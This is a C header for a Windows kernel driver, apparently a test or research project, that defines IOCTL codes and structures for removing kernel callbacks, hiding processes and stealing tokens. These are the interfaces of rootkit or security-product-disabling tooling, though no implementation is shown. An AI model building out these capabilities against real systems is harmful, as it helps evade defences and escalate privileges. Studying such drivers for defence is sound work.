#pragma once

#ifndef _KERNEL_MODE
#include <windows.h>
#include <winioctl.h>
#else
#include <ntddk.h>
#endif

// Must be defined before any CTL_CODE that references it
#define JOCKY_DEVICE_TYPE 0x8000

#define IOCTL_JOCKY_PING             CTL_CODE(JOCKY_DEVICE_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_ENUM_PROCS       CTL_CODE(JOCKY_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_REMOVE_CALLBACKS CTL_CODE(JOCKY_DEVICE_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_HIDE_PROCESS     CTL_CODE(JOCKY_DEVICE_TYPE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_STEAL_TOKEN      CTL_CODE(JOCKY_DEVICE_TYPE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

// System device path and user-mode symbolic link
#define DEVICE_NAME_SYS    L"\\Device\\JockyTestDevice"
#define SYMBOLIC_LINK_NAME L"\\DosDevices\\JockyTestDevice"
#define USER_MODE_PATH     L"\\\\.\\JockyTestDevice"

#define MAX_PROCESSES 256

typedef struct _JOCKY_PID_INPUT {
    ULONG TargetPid;
} JOCKY_PID_INPUT;

typedef struct _PROCESS_ENTRY {
    ULONG Pid;
    CHAR  ImageName[16];
} PROCESS_ENTRY;

typedef struct _PROCESS_LIST {
    ULONG        Count;
    PROCESS_ENTRY Entries[MAX_PROCESSES];
} PROCESS_LIST;
